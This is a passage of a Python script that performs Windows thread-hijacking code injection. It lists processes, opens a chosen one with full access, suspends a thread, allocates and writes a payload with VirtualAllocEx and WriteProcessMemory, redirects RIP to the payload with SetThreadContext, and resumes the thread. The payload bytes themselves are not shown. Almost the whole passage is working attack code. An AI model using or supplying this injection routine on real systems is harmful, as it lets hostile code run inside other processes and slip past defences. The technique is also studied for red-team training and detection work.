    print(f"\n[+] Writing original RIP to new RSP on new stack: ")

    old_rip_bytes = original_rip.to_bytes(8, 'little')
    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        new_rsp,                # lpBaseAddress
        old_rip_bytes,          # lpBuffer
        RET_ADDR_SIZE,          # nSize
        ctypes.byref(n_written)
    ):
        raise winerr()
    
    print(f"    -> Success, bytes written: {n_written.value}")


    # overwrite the buffer with the NEW values
    print(f"\n[+] Overwriting context buffer with new values: ", end='')
    
    struct.pack_into("<Q", aligned_buffer, 152, new_rsp) # o/w RSP @ 152
    struct.pack_into("<Q", aligned_buffer, 248, lpBaseAddress) # o/w RIP @ 248 -> payload address
    print("Success")


    # ---------- SET: apply changes ----------

    # Apply changes
    print(f"[+] Applying changes -> SetThreadContext(): ", end='')
    if not kernel32.SetThreadContext(hThread, aligned_buffer):
        raise winerr()
    print("Success")





# ----------------------------------
# Context Managers
# ----------------------------------
#
# To be able to use 'with x as y:'
# - to automatically close handles upon exit

@contextmanager
def open_process(
        dwProcessId, 
        dwDesiredAccess=PROCESS_ALL_ACCESS, 
        bInheritHandle=False):
    print(f"\n[+] Opening Handle to Process: ", end='', flush=True)

    handle = wintypes.HANDLE(kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId))

    if not handle:
        raise winerr()

    print(f"Success ({handle.value})")

    try:
        yield handle        # give caller, access to handle
    finally:
        close_handle(handle, "Process")
        handle.value = 0




@contextmanager
def snapshot(flags=TH32CS_SNAPPROCESS):
    print("\n[+] Creating handle to Snapshot: ", end='')
    hSnapshot = wintypes.HANDLE(kernel32.CreateToolhelp32Snapshot(flags, 0))

    if hSnapshot == INVALID_HANDLE_VALUE:
        raise winerr()

    print(f"Success ({hSnapshot.value})")

    try:
        yield hSnapshot     # give caller, access to handle
    finally:
        close_handle(hSnapshot, "Snapshot")
        hSnapshot.value = 0




##########################################
##### Main functionality starts here #####
##########################################

# confirm CONTEXT64 struct information
debug_cpu_registers()




# ----- Process Id information -----
print_hdr("\n>>>>    Handling Process Information: CreateToolhelp32Snapshot()    <<<<\n")
proc_groups, pid_map = group_pids_by_process()  # proc_groups: defaultdict[str, list[int]] // pid_map: dict[int, str]


print_pids_by_process(proc_groups)
chosen_pid = request_pid(pid_map)


with open_process(chosen_pid) as hProcess:
    
    # ----- Thread Id information -----
    print_hdr("\n>>>>    Handling Thread Information: CreateToolhelp32Snapshot()    <<<<\n")
    hThread_worker, dwThreadId_worker = get_single_worker_thread(chosen_pid)
    suspend_thread(hThread_worker, dwThreadId_worker)



    
    # ----- Memory Manipulation -----
    print_hdr("\n>>>>    Allocating Memory: VirtualAllocEx()    <<<<\n")
    lpBaseAddress = allocate_memory(hProcess, len(payload))
    allocate_memory_verification(hProcess, lpBaseAddress)




    # ----- Write -----
    print_hdr("\n>>>>    Writing Payload to Allocated Memory: WriteProcessMemory()    <<<<\n")
    write_payload(hProcess, lpBaseAddress, payload)
    write_payload_verification(hProcess, lpBaseAddress, payload)




    # ----- Thread Context -----
    print_hdr("\n>>>>    Get CPU Register Information: GetThreadContext()    <<<<\n")
    get_current_registers_context(hProcess, hThread_worker, lpBaseAddress)




    # ----- Execute -----
    print_hdr("\n>>>>    Executing payload: ResumeThread()    <<<<\n")
    resume_thread(hThread_worker, dwThreadId_worker)




    # ----- Cleanup -----
    print_hdr("\n>>>>    Cleaning up resources    <<<<\n")
    close_handle(hThread_worker, "Worker Thread")

